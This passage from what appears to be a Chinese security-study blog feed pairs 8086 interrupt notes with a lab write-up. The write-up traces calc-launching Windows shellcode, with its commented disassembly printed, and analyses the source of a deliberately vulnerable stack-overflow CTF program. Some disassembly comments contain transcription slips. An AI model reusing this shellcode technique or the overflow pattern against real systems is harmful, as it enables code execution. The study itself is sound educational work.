<p> CPU 在收到中断信息之后，需要对中断进行处理，中断处理程序就是用来处理对应中断的程序，CPU 在收到中断信息之后, 就会转去执行对应的中断处理程序，中断处理程序由程序员编写；</p>
<p> 中断处理程序的常规步骤：</p>
<ol>
<li> 保存用到的寄存器；</li>
<li> 处理中断；</li>
<li> 恢复用到的寄存器；</li>
<li> 用 iret 指令返回；</li>
</ol>
</li>
<li><p>中断向量</p>
<p> 中断程序的入口地址；</p>
</li>
<li><p>中断向量表</p>
<ul>
<li>  记录中断向量的列表；</li>
<li>  中断向量表在内存中保存, 存放着 256 个中断源所对应的中断处理程序的入口地址；</li>
<li>  CPU 根据中断类型码作为中断向量表的表项号，定位相应的表项，从而得到中断处理程序的入口地址；</li>
<li>  对于 8086PC 机，中断向量表存放在0000:0000~0000:03FF所在的内存中，每个表项占用两个字节的大小，高地址字存放段地址，低地址字存放偏移地址；</li>
</ul>
</li>
<li><p>中断过程</p>
<p> CPU进行中断处理</p>
<ol>
<li> 从中断信息中获取中断类型码；</li>
<li> 标志寄存器的值入栈；</li>
<li> 设置标志寄存器的第8位TF和第9位IF的值为0；</li>
<li> CS的内容入栈；</li>
<li> IP的内容入栈；</li>
<li> 从内存地址为中断类型码*4和中断类型码*4+2的两个单元中读取中断处理程序的入口地址放入IP和CS中；</li>
</ol>
<p> 更简洁的描述中断过程如下：</p>
<ol>
<li> 取得中断码N；</li>
<li> <code>pushf</code></li>
<li> <code>TF=0,IF=0</code></li>
<li> <code>push CS</code></li>
<li> <code>Push IP</code></li>
<li> <code>(IP)=(N*4),CS=(N*4+2)</code></li>
</ol>
</li>
</ol>
<h3 id="外中断"><a href="#外中断" class="headerlink" title="外中断"></a>外中断</h3><ul>
<li><p>  由外部设备发生的事件引发的中断；</p>
</li>
<li><p>外中断分为两大类：不可屏蔽中断、可屏蔽中断；</p>
<ul>
<li>不可屏蔽中断<ul>
<li>  不可屏蔽中断是CPU必须响应的中断；</li>
<li>  当CPU检测不可屏蔽中断信息时，则在执行完当前指令后，立即响应，引发中断过程；</li>
<li>  对8086CPU不可屏蔽中断的中断类型码固定为2；</li>
</ul>
</li>
<li>可屏蔽中断<ul>
<li>  可屏蔽中断是CPU可以不响应的外中断；</li>
<li>  CPU是否响应可屏蔽中断，要看标志寄存位IF位的设置；</li>
<li>当CPU检测到可屏蔽中断信息：<ul>
<li>  如果IF = 1，CPU在执行完当前指令后响应中断，引发中断过程；</li>
<li>  如果IF = 0，不响应可屏蔽中断；</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>  几乎所有由外设引发的中断，都是可屏蔽中断，如键盘输入、打印机请求；</p>
</li>
<li><p>  不可屏蔽中断在系统中有必须处理的紧急请求情况发生时来通知CPU中断信息，比如机器突然掉电；</p>
</li>
<li><p>外中断处理过程如下</p>
<ul>
<li><p>可屏蔽中断引发的中断处理过程：</p>
<ol>
<li><p>取中断类型码n；</p>
<ul>
<li>  可屏蔽中断信息来自CPU外部，中断类型码是通过数据总线送入CPU；</li>
<li>  对比内中断：中断类型码是在CPU内部产生；</li>
</ul>
</li>
<li><p>标志寄存器入栈，<code>IF=0 ,F=0</code>；</p>
<ul>
<li>  将IF置为0的原因：进入中断处理程序后，禁止其他可屏蔽中断；</li>
<li>  如果在中断处理程序中需要处理可屏蔽中断，可以用指令将IF置为1；</li>
</ul>
</li>
<li><p> <code>CS,IP</code>入栈；</p>
</li>
<li><p> <code>(IP)=(n*4),CS=(n*4+2)</code>；</p>
</li>
<li><p> 由此转去执行中断处理程序；</p>
</li>
</ol>
</li>
<li><p>不可屏蔽中断的中断过程：</p>
<ol>
<li><p> 中断值固定为2，不必取中断码</p>
</li>
<li><p> 标志寄存器入栈，<code>IF= 0,TF = 0</code></p>
</li>
<li><p> <code>CS,IP</code>入栈</p>
</li>
<li><p> <code>(IP) = (8),CS = (0AH)</code></p>
</li>
</ol>
</li>
</ul>
</li>
</ul>
<h2 id="直接定址表"><a href="#直接定址表" class="headerlink" title="直接定址表"></a>直接定址表</h2><h3 id="标号"><a href="#标号" class="headerlink" title="标号"></a>标号</h3><p>在汇编代码中，可以用标号表示该段代码的内存地址；</p>
<p>标号格式为<code>标号名:冒号</code>  例如<code>start:</code>；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">start:mov ax,0</span><br><span class="line">  mov bx,ax</span><br></pre></td></tr></table></figure>

<h3 id="数据标号"><a href="#数据标号" class="headerlink" title="数据标号"></a>数据标号</h3><ul>
<li><p>  普通的标号只能表示内存地址；</p>
</li>
<li><p>  数据标号既可以表示内存地址，也可以表示内存单元的长度；</p>
</li>
<li><p>  使用数据标号可以以更加简洁的方式访问内存中的数据；</p>
</li>
<li><p>  数据标号的格式为：<code>标号名</code>，没有冒号；</p>
</li>
<li><p>例如：使用数据标号，实现数值的累加</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">	a db 1,2,3,4,5,6,7,8</span><br><span class="line">	b dw 0</span><br><span class="line"> </span><br><span class="line">start:mov si,0</span><br><span class="line">	mov cx,8</span><br><span class="line">s:mov al,a[si] </span><br><span class="line">	mov ah,0</span><br><span class="line">	add b,ax</span><br><span class="line">	inc si</span><br><span class="line">	loop s</span><br><span class="line">	</span><br><span class="line">	mov ax,4c00h</span><br><span class="line">	int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>

<ul>
<li>  在上面的代码中，a、b为数据标号；</li>
<li>  可以使用类似<code>a[si]</code>的方式获取标号a处偏移量为si的值的数据；</li>
<li>  注意数据标号的类型，例如上面的a是字节型数据单元，不能使用字型单元的mov指令；</li>
</ul>
</li>
<li><p>在其他段使用数据标号</p>
<ul>
<li><p>  普通的标号只能在代码段中使用，例如标号<code>s:</code>出现在数据段中会报错；</p>
</li>
<li><p>  一般情况下会将数据段和代码段分开，并且在数据段中保存数据，在代码段中保存代码，普通标号无法满足访问数据的需要；</p>
</li>
<li><p>使用数据标号可以解决标号无法在其它段中的问题；</p>
<p>  例如</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assume cs:code,ds:data</span><br><span class="line">data segment</span><br><span class="line">  a db 1,2,3,4,5</span><br><span class="line">  b dw 0</span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">start:  mov ax,data</span><br><span class="line">	mov ds,ax</span><br><span class="line">	mov si,0</span><br><span class="line">	mov cx,5</span><br><span class="line">s: mov al,a[si]</span><br><span class="line">	mov ah,0</span><br><span class="line">	add b,ax</span><br><span class="line">	inc si</span><br><span class="line">	loop s</span><br><span class="line">  mov ax,4c00h</span><br><span class="line">  int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>

<ul>
<li>  如果想要在代码段中使用标号访问数据段，需要使用伪指令assume将段寄存器和标号所在段关联；</li>
<li>   assume的关联是为了让编译器可以识别标号所在段的段地址在哪个寄存器中，实际代码中还需要将段寄存器指向对应的段；</li>
<li>  比如：上面的代码中，想要使用数据标号a、b，用assume伪指令关联ds和data；</li>
<li>  但assume只是将关联告诉了编译器，实际的代码段中还需要用mov ax,data和mov ds,ax指令来将ds指向data；</li>
</ul>
</li>
</ul>
</li>
<li><p>使用数据标号储存两个数据标号的段地址和偏移地址</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data segment</span><br><span class="line">  a db 1,2,3,4,5</span><br><span class="line">  b dw 0</span><br><span class="line">  c dd a,b</span><br><span class="line">data ends</span><br></pre></td></tr></table></figure>

<p>  相当于：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data segment</span><br><span class="line">  a db 1,2,3,4,5</span><br><span class="line">  b dw 0</span><br><span class="line">  c dw offset a,seg a,offset b,seg b</span><br><span class="line">data ends</span><br></pre></td></tr></table></figure>

<p>  seg功能为取得某一标号的段地址；</p>
</li>
</ul>
<h3 id="直接定址表-1"><a href="#直接定址表-1" class="headerlink" title="直接定址表"></a>直接定址表</h3><ul>
<li><p>  在编程时常会遇到一些比如用给出的数据通过计算来获得结果的问题；</p>
</li>
<li><p>例如：将一个数转换成十六进制显示；</p>
<ul>
<li>  当一次需要转换的数字很多时，需要多次进行重复的计算转换；</li>
<li>  为了简化操作，可以将问题转换为用给出的数据作为查表的依据，通过查表获得结果；</li>
<li>具体操作是：<ul>
<li>  建一张数据和结果映射表；</li>
<li>  用数据为条件，计算结果在表中的位置也就获取了结果；</li>
</ul>
</li>
<li>  例如：将0~F对应的ascii码放入一个数据段中，根据所给数值的大小来计算该数值对应的ascii在数据段中的地址；这样就不用每次都做将数值转换成ascii的操作；</li>
</ul>
</li>
<li><p>这种可以依据数据，直接计算出所要找的元素的位置的表称为直接定址表；</p>
</li>
</ul>
<p>参考：《汇编语言》-王爽</p>
]]></content>
      <categories>
        <category>二进制学习</category>
      </categories>
      <tags>
        <tag>寄存器</tag>
        <tag>Assembly language</tag>
        <tag>指令</tag>
        <tag>寻址方式</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞分析技术实验一</title>
    <url>/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%80.html</url>
    <content><![CDATA[<h1 id="实验目标"><a href="#实验目标" class="headerlink" title="实验目标"></a>实验目标</h1><p>掌握shellcode在漏洞利用中的基本用法及编码方法。</p>
<h1 id="实验内容要求"><a href="#实验内容要求" class="headerlink" title="实验内容要求"></a>实验内容要求</h1><ol>
<li>根据实验软件SCer.exe和shellcode 代码sc1.bin，通过windbg逆向分析弹出计算器的漏洞利用详细过程，形成实验报告提交；</li>
<li>根据实验题目sc2，撰写详细的解题过程，至少包括漏洞成因分析、漏洞利用思路阐述，最终形成实验报告提交；<span id="more"></span></li>
</ol>
<h1 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h1><h2 id="分析sc1-bin弹出计算器的漏洞利用详细过程"><a href="#分析sc1-bin弹出计算器的漏洞利用详细过程" class="headerlink" title="分析sc1.bin弹出计算器的漏洞利用详细过程"></a>分析sc1.bin弹出计算器的漏洞利用详细过程</h2><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><ul>
<li>操作系统：Windows XP Professional Service Pack 3</li>
<li>工具：windbg、Scer.exe、Notepad++</li>
</ul>
<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ol>
<li><p>使用SCer.exe测试sc1.bin文件，成功弹出计算器，说明shellcode可以运行；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570694705353.png" alt="1570694705353"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570694728011.png" alt="1570694728011"></p>
</li>
<li><p>用scer.exe先把cs1.bin文件转为字符串sc1.bin.sc文件，在最前面加上<code>0xCC</code>。在汇编中<code>0xCC</code>对应的汇编指令为<code>int 3</code>，该指令是系统的中断指令，可以理解为在 windbg中提前设置好了一个断点；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570694910561.png" alt="1570694910561"></p>
</li>
<li><p>再使用Scer.exe将更改后得sc1.bin.sc文件转换成可执行得bin文件sc1.bin.sc.mybin；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570695122571.png" alt="1570695122571"></p>
</li>
<li><p>打开windbg，依次选择<code>File</code>、<code>Open Executable Files</code>、<code>Scer.exe</code>，使用windbg调试Scer.exe，选择<code>Debug</code>、<code>Go</code>，弹出Scer.exe的界面；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570695714811.png" alt="1570695714811"></p>
</li>
<li><p>将sc1.bin.sc.mybin文件拖入Scer.exe输入框，点击执行shellcode，运行至设置的<code>0XCC</code>断点处，根据断点，得到shellcode汇编代码如下；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570696124449.png" alt="1570696124449"></p>
</li>
<li><p>开始调试shellcode</p>
<ol>
<li><p>先跳转至<code>0x00b40057</code>处；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570720367525.png" alt="1570720367525"></p>
</li>
<li><p>将地址<code>0x69cc4e7h</code>压入栈中；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570720397247.png" alt="1570720397247"></p>
</li>
<li><p>调用地址<code>0x00b40003</code>；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570720439856.png" alt="1570720439856"></p>
</li>
<li><p>将esi置空；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570720495667.png" alt="1570720495667"></p>
</li>
<li><p>fs寄存器指向TEB结构，TEB结构地址偏移<code>0x30</code>指向PEB结构，即将PEB结构的地址赋给esi；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570720534446.png" alt="1570720534446"></p>
<p>其中PEB结构如下；</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    UCHAR InheritedAddressSpace; <span class="comment">// 00h</span></span><br><span class="line">    UCHAR ReadImageFileExecOptions; <span class="comment">// 01h</span></span><br><span class="line">    UCHAR BeingDebugged; <span class="comment">// 02h</span></span><br><span class="line">    UCHAR Spare; <span class="comment">// 03h</span></span><br><span class="line">    PVOID Mutant; <span class="comment">// 04h</span></span><br><span class="line">    PVOID ImageBaseAddress; <span class="comment">// 08h</span></span><br><span class="line">    PPEB_LDR_DATA Ldr; <span class="comment">// 0Ch</span></span><br><span class="line">    …………</span><br><span class="line">&#125;PEB,*PPEB</span><br></pre></td></tr></table></figure></li>
<li><p>利用PEB结构偏移<code>0x0C</code>找到<code>PPEB_LDR_DATA Ldr</code>；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570720591411.png" alt="1570720591411"></p>
<p>其中_PEB_LDR_DATA结构如下；</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB_LDR_DATA</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG Length; <span class="comment">// +0x00</span></span><br><span class="line">    BOOLEAN Initialized; <span class="comment">// +0x04</span></span><br><span class="line">    PVOID SsHandle; <span class="comment">// +0x08</span></span><br><span class="line">    LIST_ENTRY InLoadOrderModuleList; <span class="comment">// +0x0c</span></span><br><span class="line">    LIST_ENTRY InMemoryOrderModuleList; <span class="comment">// +0x14</span></span><br><span class="line">	LIST_ENTRY InInitializationOrderModuleList;<span class="comment">// +0x1c</span></span><br><span class="line">&#125; PEB_LDR_DATA,*PPEB_LDR_DATA; <span class="comment">// +0x24</span></span><br></pre></td></tr></table></figure></li>
<li><p>利用<code>PPEB_LDR_DATA Ldr</code>偏移<code>0x1C</code>找到<code>LIST_ENTRY InInitializationOrderModuleList</code>，它是指向<code>LDR_MODULE</code>链表结构中，相应的双向链表头部的指针；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570720625434.png" alt="1570720625434"></p>
</li>
<li><p>该动态链表按顺序存放着PE装入运行时初始化模块的信息第一个链表节点是ntdll.dll，第二个链表结点就是kernel32.dll，因此偏移<code>0x08</code>处为ntdll.dll地址，即ebp偏移<code>0x08</code>后指向ntdll.dll；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570720888291.png" alt="1570720888291"></p>
</li>
<li><p>将esi指向的内存的地址处的数据赋值给esi，即将链表下一节点放入esi；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570722168233.png" alt="1570722168233"></p>
</li>
<li><p>从ntdll.dll加载基址算起，偏移<code>0x3c</code>的地方就是其PE文件头，PE头偏移<code>0x78</code>的地方存放着指向函数导出表的指针，连续两次运算，使得ebx的值为<code>0x00003400</code>；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570723107241.png" alt="1570723107241"></p>
</li>
<li><p>由于ebx的值为<code>0x00003400</code>，<code>test ebx,ebp</code>结果不改变FLAG寄存器的状态，故不会进行下一步的跳转；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570723521474.png" alt="1570723521474"></p>
</li>
<li><p>将输出表地址存入ebx中；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570723747826.png" alt="1570723747826"></p>
</li>
<li><p>根据表的结构，在偏移地址<code>0x18</code>处存储着函数数目，把表里的函数数目放入ecx中；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570723703471.png" alt="1570723703471"></p>
</li>
<li><p><code>jcxz</code>即<code>jump if cx equals zero</code>，当<code>ecx=0</code>时跳转到<code>0x00b4000f</code>，此时ecx不为0，故不进行跳转；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570724269799.png" alt="1570724269799"></p>
</li>
<li><p>导出表偏移<code>0x20</code>处的指针指向存储导出函数函数名的列表，将列表中第一个函数的地址赋给edi；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570724951706.png" alt="1570724951706"></p>
</li>
<li><p>将列表中最后一个函数的地址赋值给edi；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570725038291.png" alt="1570725038291"></p>
</li>
<li><p>将eax置空，用作索引；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570725066226.png" alt="1570725066226"></p>
</li>
<li><p>把edx的每一位变为eax的最高位，再把edx扩展为eax的高位，即变为64位；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570725199028.png" alt="1570725199028"></p>
</li>
<li><p>接下来几步构成了一个循环，相当于对函数名进行了一个处理，包括使得ebp中存储的地址变为kernel32.dll的地址；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570771191258.png" alt="1570771191258"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570773348206.png" alt="1570773348206"></p>
</li>
<li><p>执行到cmp ，把值和栈顶+4处，一开始入栈的值比较，一开始入栈的其实是winexc经过处理得到的值，对比不相等就再次进行循环，跳到loopne换下一个函数名；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570771333009.png" alt="1570771333009"></p>
</li>
<li><p>经过多次循环没找到就会跳回<code>0x00b4000f</code>，换一个dll继续寻找；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570771446664.png" alt="1570771446664"></p>
</li>
<li><p>先将数组赋值给edx，存储函数序号，再加上edp，得到函数名称列表地址，再加上<code>ecx*2</code>,得到目标函数序号；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570771910484.png" alt="1570771910484"></p>
</li>
<li><p>将edi指向一个RVA数组，再加上ebp存储的kernel32.dll的基地址，得到导出函数地址；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570771986846.png" alt="1570771986846"></p>
</li>
<li><p>计算出最终的目标地址；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570772442097.png" alt="1570772442097"></p>
</li>
<li><p>使用<code>ret</code>指令返回；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570772516947.png" alt="1570772516947"></p>
</li>
<li><p>进行一系列的函数压栈、弹栈操作；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570772640877.png" alt="1570772640877"></p>
</li>
<li><p>调用ebp存储的地址<code>0x7c8623ad</code>上存储的<code>winExec</code>函数；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570773507362.png" alt="1570773507362"></p>
</li>
<li><p>在进入<code>winExec</code>函数后，执行与上述寻找winexc类似的操作，这里不在叙述，直至找到调用计算器函数<code>calc</code>并执行弹出计算器；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570774960954.png" alt="1570774960954"></p>
</li>
</ol>
</li>
<li><p>shellcode的汇编代码及备注如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jmp		00b40057</span><br><span class="line">xor		esi,esi						//将esi置空</span><br><span class="line">mov		esi,dword ptr fs:[esi+30h]	//将PEB结构的地址赋给esi</span><br><span class="line">mov		esi,dword ptr [esi+0Ch]		//将PPEB_LDR_DATA Ldr结构的地址赋给esi</span><br><span class="line">mov		esi,dword ptr [esi+1Ch]		//将LDR_MODULE链表地址赋给esi</span><br><span class="line">mov		ebp,dword ptr [esi+8]		//将ntdll.dll地址赋给ebp</span><br><span class="line">mov		esi,dword ptr [esi]			//将链表下一节点放入esi</span><br><span class="line">mov		ebx,dword ptr [ebp+3Ch]		//接下来两步将PE头存放着指向函数导出表的指针赋给ebx</span><br><span class="line">mov		ebx,dword ptr [ebp+ebx+78h]</span><br><span class="line">test	ebx,ebx</span><br><span class="line">je		00b400f</span><br><span class="line">add		ebp,ebp						//将输出表地址存入ebx中</span><br><span class="line">mov		ecx,dword ptr [ebx+18h]		//表里的函数数目放入ecx</span><br><span class="line">jcxz	00b400f</span><br><span class="line">mov		edi,dword ptr [ebx+20h]		//将列表中第一个函数的地址赋给edi</span><br><span class="line">add		edi,ebp</span><br><span class="line">mov		edi,dword ptr [edi+ecx*4-4]	//将列表中最后一个函数的地址赋给edi</span><br><span class="line">add		edi,ebp</span><br><span class="line">xor		eax,eax						//将eax置空，用作索引</span><br><span class="line">cdq									//把edx的每一位变为eax的最高位，再把edx扩展为eax的高位，即变为64位</span><br><span class="line">add		dl,byte ptr [edi]			//接下来几步构成了一个循环，相当于对函数名进行了一个处理</span><br><span class="line">ror		edx,4</span><br><span class="line">scas	byte ptr es:[edi]</span><br><span class="line">jne		00b40035</span><br><span class="line">cmp		edx,dword ptr [edi+4]		//把值和栈顶+4处，一开始入栈的值比较，一开始入栈的其实是winexc经过处理得到的值，对比不相等就再次进行循环，跳到loopne换下一个函数名</span><br><span class="line">loopne	00b40027</span><br><span class="line">jne		00b4000f</span><br><span class="line">mov		edx,dword ptr [ebx+24h]		//先将数组赋值给edx，存储函数序号，再加上edp，得到函数名称列表地址，再加上ecx*2,得到目标函数序号</span><br><span class="line">add		edx,edp</span><br><span class="line">movzx	edx,word ptr [edx+ecx*2]</span><br><span class="line">mov		edi,dword ptr [ebx+1Ch]		//将edi指向一个RVA数组，再加上ebp存储的kernel32.dll的基地址，得到导出函数地址</span><br><span class="line">add		edi,ebp</span><br><span class="line">add		ebp,dword ptr [edi+edx*4]	//计算出最终的目标地址</span><br><span class="line">ret									//使用ret返回指令</span><br><span class="line">push	69CCC4E7h					//进行一系列的函数压栈、弹栈操作</span><br><span class="line">call	00b40003</span><br><span class="line">push	eax</span><br><span class="line">push	636C6163h</span><br><span class="line">mov		edx,esp</span><br><span class="line">inc		eax</span><br><span class="line">push	eax</span><br><span class="line">push	edx</span><br><span class="line">call	ebp</span><br><span class="line">push	2A60A677h</span><br><span class="line">call	00b40003</span><br><span class="line">push	eax</span><br><span class="line">call	ebp							//调用ebp存储的地址0x7c8623ad上存储的winExec函数</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="根据实验题目sc2，撰写详细的解题过程"><a href="#根据实验题目sc2，撰写详细的解题过程" class="headerlink" title="根据实验题目sc2，撰写详细的解题过程"></a>根据实验题目sc2，撰写详细的解题过程</h2><h3 id="实验环境-1"><a href="#实验环境-1" class="headerlink" title="实验环境"></a>实验环境</h3><ul>
<li>操作系统：Kali Linux</li>
<li>工具：pwntools、gdb</li>
</ul>
<h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h3><ol>
<li><p>函数源码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">Discription:</span></span><br><span class="line"><span class="comment">   [vul]--&gt; stack overflow vulnerability</span></span><br><span class="line"><span class="comment">   [solve clue]--&gt; use bof to execute shellcode in the stack</span></span><br><span class="line"><span class="comment">   [writer]--&gt; carter   2018.5.20</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> alarm_time 500</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> filter_num 2</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">	setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">	alarm(alarm_time);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">egg</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//__asm__ (&quot;jmp *-0x30(%rsp);&quot;);</span></span><br><span class="line">	__asm__(<span class="string">&quot;sub rsp,0x30;jmp rsp;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">check_input</span><span class="params">(<span class="type">char</span> *ss)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> filter[<span class="number">8</span>] = &#123;<span class="string">&#x27;\xaa&#x27;</span>,<span class="string">&#x27;\xbb&#x27;</span>&#125;;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;filter_num;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="built_in">strlen</span>(ss);j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(ss[j]==filter[i])</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span>;	</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bof</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> content[<span class="number">48</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Input your content: &quot;</span>);</span><br><span class="line">	read(<span class="number">0</span>,content,<span class="number">60</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strlen</span>(content)&gt;=<span class="number">48</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Detect bof!&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(!check_input(content))</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	init();</span><br><span class="line">	bof();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>源代码分析</p>
<ol>
<li>main函数调用init函数和bof函数；</li>
<li>init函数的功能是初始化，设置了输入输出流和程序限定时间；</li>
<li>bof函数：<ol>
<li>声明一个长度位48的字符串数组；</li>
<li>输出字符串<code>Input your content: </code>；</li>
<li>调用read函数，读取60个字符，放入字符串数组content中；</li>
<li>判断字符串数组content的长度是否大于48，如果超过48，则输出<code>Detect bof!</code>，并且异常退出；</li>
<li>调用check_input函数，检查字符串中是否包含<code>\xaa</code>、<code>\xbb</code>，如果包含，则异常退出；</li>
</ol>
</li>
<li>egg函数通过降低地址扩展栈空间；</li>
</ol>
</li>
<li><p>漏洞利用</p>
<p>字符串数组content长度为48，输入的字符数为60，造成字符串溢出，可以使用<code>0x00</code>绕过限制48个字符的判断；</p>
</li>
<li><p>分析过程</p>
<ol>
<li><p>使用checksec工具查看二进制代码的保护，Stack没有保护措施，可以利用栈溢出攻击，NX显示disabled，有执行栈上代码的权限；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570784221146.png" alt="1570784221146"></p>
</li>
<li><p>使用gdb调试sc2；</p>
